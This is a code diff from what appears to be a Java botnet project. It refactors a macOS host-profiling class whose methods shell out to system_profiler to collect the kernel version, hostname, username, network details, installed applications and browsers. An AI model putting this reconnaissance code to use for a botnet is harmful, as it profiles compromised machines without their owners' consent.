@@ -1,8 +1,7 @@
-package com.acmutv.botnet.core.analysis;
+package com.acmutv.botnet.tool.runtime;
 
 import java.util.Random;
 
-import com.acmutv.botnet.tool.runtime.RunCmdTools;
 import lombok.Data;
 import lombok.NoArgsConstructor;
 
@@ -25,7 +24,7 @@ public class AppleSysInfoTools {
 	 * @return kernel Version
 	 */
 	public String getKernelVersion(){
-		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  Kernel' 'Version | awk -F':' '{print $2}'");
+		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Kernel' 'Version | awk -F':' '{print $2}'");
 	}
 	
 	/**
@@ -33,7 +32,7 @@ public class AppleSysInfoTools {
 	 * @return hostname
 	 */
 	public String getHostName(){
-		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  Computer' 'Name | awk -F':' '{print $2}'");
+		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  Computer' 'Name | awk -F':' '{print $2}'");
 	}
 	
 	/**
@@ -41,7 +40,7 @@ public class AppleSysInfoTools {
 	 * @return username
 	 */
 	public String getUserName(){
-		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  User' 'Name | awk -F':' '{print $2}'");
+		return RuntimeManager.runCmd("system_profiler SPSoftwareDataType | grep -e  User' 'Name | awk -F':' '{print $2}'");
 	}
 	
 	/**
@@ -49,7 +48,7 @@ public class AppleSysInfoTools {
 	 * @return network info
 	 */
 	public String getNetworkData(){
-		return RunCmdTools.runCmd("system_profiler SPAirPortDataType");
+		return RuntimeManager.runCmd("system_profiler SPAirPortDataType");
 	}
 	
 	/**
@@ -57,7 +56,7 @@ public class AppleSysInfoTools {
 	 * @return applications list
 	 */
 	public String getApplications(){
-		return RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
+		return RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
 	}
 	
 	/**
@@ -65,7 +64,7 @@ public class AppleSysInfoTools {
 	 * @return local connections list
 	 */
 	public String getNetworkLocations(){
-		return RunCmdTools.runCmd("system_profiler SPNetworkLocationDataType");
+		return RuntimeManager.runCmd("system_profiler SPNetworkLocationDataType");
 	}
 	
 	/**
@@ -73,7 +72,7 @@ public class AppleSysInfoTools {
 	 * @return browsers list
 	 */
 	public String getBrowsers(){
-		String app = RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
+		String app = RuntimeManager.runCmd("system_profiler SPApplicationsDataType");
 		String browsers = "";
 		
 		if(app.contains("Chrome.app"))
